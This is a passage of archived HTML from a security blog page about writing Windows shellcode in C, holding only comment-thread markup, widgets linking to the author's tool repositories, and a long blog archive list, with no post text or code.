id="c2736938701472144255-ra" class="thread-chrome thread-expanded"><div></div><div id="c2736938701472144255-continue" class="continue"><a class="comment-reply" target="_self" data-comment-id="2736938701472144255" href="javascript:;">Reply</a></div></ol></div></div><div class="comment-replybox-single" id="c2736938701472144255-ce"></div></li></div><div id="c7477859239477511706-continue" class="continue"><a class="comment-reply" target="_self" data-comment-id="7477859239477511706" href="javascript:;">Reply</a></div></ol></div></div><div class="comment-replybox-single" id="c7477859239477511706-ce"></div></li></ol><div id="top-continue" class="continue hidden"><a class="comment-reply" target="_self" href="javascript:;">Add comment</a></div><div class="comment-replybox-thread" id="top-ce"><iframe allowtransparency="true" class="blogger-iframe-colorize blogger-comment-from-post" frameborder="0" height="194px" id="comment-editor" name="comment-editor" src="./Writing Optimized Windows Shellcode in C_files/comment-iframe.html" width="100%" style="display: block;" allow="autoplay &#39;self&#39;; fullscreen &#39;self&#39;" data-resized="true"></iframe></div><div class="loadmore hidden" data-post-id="299909111219502438"><a target="_self">Load more...</a></div></div>
+</div>
+</div>
+<p class="comment-footer">
+</p><div class="comment-form">
+<a name="comment-form"></a>
+<p>
+</p>
+<a href="https://web.archive.org/web/20210305190309/https://www.blogger.com/comment-iframe.g?blogID=6052198192158185644&amp;postID=299909111219502438&amp;blogspotRpcToken=5956189" id="comment-editor-src"></a>
+
+<script src="./Writing Optimized Windows Shellcode in C_files/3858658042-comment_from_post_iframe.js.download" type="text/javascript"></script>
+<script type="text/javascript">
+      BLOG_CMT_createIframe('https://web.archive.org/web/20210305190309/https://www.blogger.com/rpc_relay.html');
+    </script>
+</div>
+<p></p>
+<div id="backlinks-container">
+<div id="Blog1_backlinks-container">
+</div>
+</div>
+</div>
+</div>
+
+        </div></div>
+      
+</div>
+<div class="blog-pager" id="blog-pager">
+<span id="blog-pager-newer-link">
+<a class="blog-pager-newer-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/10/powershell-cil-opcode-execution.html" id="Blog1_blog-pager-newer-link" title="Newer Post">Newer Post</a>
+</span>
+<span id="blog-pager-older-link">
+<a class="blog-pager-older-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/07/WinRT-ARM-Shellcode.html" id="Blog1_blog-pager-older-link" title="Older Post">Older Post</a>
+</span>
+<a class="home-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/">Home</a>
+</div>
+<div class="clear"></div>
+<div class="post-feeds">
+<div class="feed-links">
+Subscribe to:
+<a class="feed-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/feeds/299909111219502438/comments/default" target="_blank" type="application/atom+xml">Post Comments (Atom)</a>
+</div>
+</div>
+</div></div>
+</div>
+</div>
+<div class="column-left-outer">
+<div class="column-left-inner">
+<aside>
+</aside>
+</div>
+</div>
+<div class="column-right-outer">
+<div class="column-right-inner">
+<aside>
+<div class="sidebar section" id="sidebar-right-1"><div class="widget Text" data-version="1" id="Text1">
+<h2 class="title">Twitter</h2>
+<div class="widget-content">
+<a href="https://web.archive.org/web/20210305190309/https://twitter.com/mattifestation">@mattifestation</a><br>
+</div>
+<div class="clear"></div>
+<span class="widget-item-control">
+<span class="item-control blog-admin">
+<a class="quickedit" onclick="return _WidgetManager._PopupConfig(document.getElementById(&quot;Text1&quot;));" rel="nofollow" target="configText1" title="Edit">
+<img alt="" height="18" src="./Writing Optimized Windows Shellcode in C_files/icon18_wrench_allbkg.png" width="18">
+</a>
+</span>
+</span>
+<div class="clear"></div>
+</div><div class="widget Text" data-version="1" id="Text3">
+<h2 class="title">Code</h2>
+<div class="widget-content">
+<a href="https://web.archive.org/web/20210305190309/https://github.com/mattifestation/PowerSploit">PowerSploit on GitHub</a><br><a href="https://web.archive.org/web/20210305190309/https://github.com/mattifestation/PIC_Bindshell">Window Shellcode in C</a><br><a href="https://web.archive.org/web/20210305190309/https://docs.google.com/open?id=0B-K55rLoulAfRVV3c3BScjdTUUs0dU9NUzZJTGNEUQ">Memory-Tools.ps1</a><br><a href="https://web.archive.org/web/20210305190309/https://docs.google.com/open?id=0B-K55rLoulAfQ2ZyTUhGay10NU0">Replace-x64-Process.ps1</a><br>
+</div>
+<div class="clear"></div>
+<span class="widget-item-control">
+<span class="item-control blog-admin">
+<a class="quickedit" onclick="return _WidgetManager._PopupConfig(document.getElementById(&quot;Text3&quot;));" rel="nofollow" target="configText3" title="Edit">
+<img alt="" height="18" src="./Writing Optimized Windows Shellcode in C_files/icon18_wrench_allbkg.png" width="18">
+</a>
+</span>
+</span>
+<div class="clear"></div>
+</div><div class="widget BlogArchive" data-version="1" id="BlogArchive1">
+<h2>Journey Back In Time</h2>
+<div class="widget-content">
+<div id="ArchiveList">
+<div id="BlogArchive1_ArchiveList">
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2018/">
+2018
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2018_06_03_archive.html">
+06/03 - 06/10
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2017/">
+2017
+</a>
+<span class="post-count" dir="ltr">(4)</span>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2017_08_27_archive.html">
+08/27 - 09/03
+</a>
+<span class="post-count" dir="ltr">(2)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2017_07_09_archive.html">
+07/09 - 07/16
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2017_01_01_archive.html">
+01/01 - 01/08
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2016/">
+2016
+</a>
+<span class="post-count" dir="ltr">(10)</span>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2016_12_25_archive.html">
+12/25 - 01/01
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2016_11_27_archive.html">
+11/27 - 12/04
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2016_11_20_archive.html">
+11/20 - 11/27
+</a>
+<span class="post-count" dir="ltr">(2)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2016_10_23_archive.html">
+10/23 - 10/30
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2016_09_04_archive.html">
+09/04 - 09/11
+</a>
+<span class="post-count" dir="ltr">(2)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2016_08_14_archive.html">
+08/14 - 08/21
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2016_08_07_archive.html">
+08/07 - 08/14
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2016_07_24_archive.html">
+07/24 - 07/31
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2015/">
+2015
+</a>
+<span class="post-count" dir="ltr">(6)</span>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2015_12_27_archive.html">
+12/27 - 01/03
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2015_12_20_archive.html">
+12/20 - 12/27
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2015_12_13_archive.html">
+12/13 - 12/20
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2015_11_29_archive.html">
+11/29 - 12/06
+</a>
+<span class="post-count" dir="ltr">(2)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2015_11_08_archive.html">
+11/08 - 11/15
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2014/">
+2014
+</a>
+<span class="post-count" dir="ltr">(4)</span>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2014_12_28_archive.html">
+12/28 - 01/04
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2014_07_13_archive.html">
+07/13 - 07/20
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2014_04_27_archive.html">
+04/27 - 05/04
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2014_03_30_archive.html">
+03/30 - 04/06
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate expanded">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy toggle-open">
+
+        ▼&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/">
+2013
+</a>
+<span class="post-count" dir="ltr">(11)</span>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013_11_10_archive.html">
+11/10 - 11/17
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013_09_29_archive.html">
+09/29 - 10/06
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate expanded">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy toggle-open">
+
+        ▼&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013_08_11_archive.html">
+08/11 - 08/18
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+<ul class="posts">
+<li><a href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html">Writing Optimized Windows Shellcode in C</a></li>
+</ul>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013_07_28_archive.html">
+07/28 - 08/04
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013_06_16_archive.html">
+06/16 - 06/23
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013_06_02_archive.html">
+06/02 - 06/09
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013_03_31_archive.html">
+03/31 - 04/07
+</a>
+<span class="post-count" dir="ltr">(2)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013_03_24_archive.html">
+03/24 - 03/31
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013_02_17_archive.html">
+02/17 - 02/24
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013_01_06_archive.html">
+01/06 - 01/13
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2012/">
+2012
+</a>
+<span class="post-count" dir="ltr">(19)</span>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2012_12_23_archive.html">
+12/23 - 12/30
+</a>
+<span class="post-count" dir="ltr">(2)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2012_11_25_archive.html">
+11/25 - 12/02
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2012_11_11_archive.html">
+11/11 - 11/18
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2012_08_26_archive.html">
+08/26 - 09/02
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2012_08_19_archive.html">
+08/19 - 08/26
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2012_08_12_archive.html">
+08/12 - 08/19
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2012_08_05_archive.html">
+08/05 - 08/12
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2012_07_22_archive.html">
+07/22 - 07/29
+</a>
+<span class="post-count" dir="ltr">(2)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2012_07_15_archive.html">
+07/15 - 07/22
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2012_06_24_archive.html">
+06/24 - 07/01
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2012_06_03_archive.html">
+06/03 - 06/10
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2012_05_20_archive.html">
+05/20 - 05/27
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2012_05_13_archive.html">
+05/13 - 05/20
+</a>
+<span class="post-count" dir="ltr">(2)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2012_04_22_archive.html">
+04/22 - 04/29
+</a>
+<span class="post-count" dir="ltr">(2)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2012_03_11_archive.html">
+03/11 - 03/18
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2011/">
+2011
+</a>
+<span class="post-count" dir="ltr">(11)</span>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2011_11_20_archive.html">
+11/20 - 11/27
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2011_11_13_archive.html">
+11/13 - 11/20
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2011_10_16_archive.html">
+10/16 - 10/23
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2011_09_18_archive.html">
+09/18 - 09/25
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2011_09_11_archive.html">
+09/11 - 09/18
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2011_08_28_archive.html">
+08/28 - 09/04
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2011_07_24_archive.html">
+07/24 - 07/31
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2011_07_17_archive.html">
+07/17 - 07/24
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2011_07_03_archive.html">
+07/03 - 07/10
+</a>
+<span class="post-count" dir="ltr">(1)</span>
+</li>
+</ul>
+<ul class="hierarchy">
+<li class="archivedate collapsed">
+<a class="toggle" href="javascript:void(0)">
+<span class="zippy">
+
+        ►&nbsp;
+      
+</span>
+</a>
+<a class="post-count-link" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2011_06_19_archive.html">
+06/19 - 06/26
+</a>
+<span class="post-count" dir="ltr">(2)</span>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+<div class="clear"></div>
+<span class="widget-item-control">
+<span class="item-control blog-admin">
+<a class="quickedit" onclick="return _WidgetManager._PopupConfig(document.getElementById(&quot;BlogArchive1&quot;));" rel="nofollow" target="configBlogArchive1" title="Edit">
+<img alt="" height="18" src="./Writing Optimized Windows Shellcode in C_files/icon18_wrench_allbkg.png" width="18">
+</a>
+</span>
+</span>
+<div class="clear"></div>
+</div>
+</div></div>
+</aside>
+</div>
+</div>
+</div>
+<div style="clear: both"></div>
+<!-- columns -->
+</div>
+<!-- main -->
+</div>
+</div>
+<div class="main-cap-bottom cap-bottom">
+<div class="cap-left"></div>
+<div class="cap-right"></div>
+</div>
+</div>
+<footer>
+<div class="footer-outer">
+<div class="footer-cap-top cap-top">
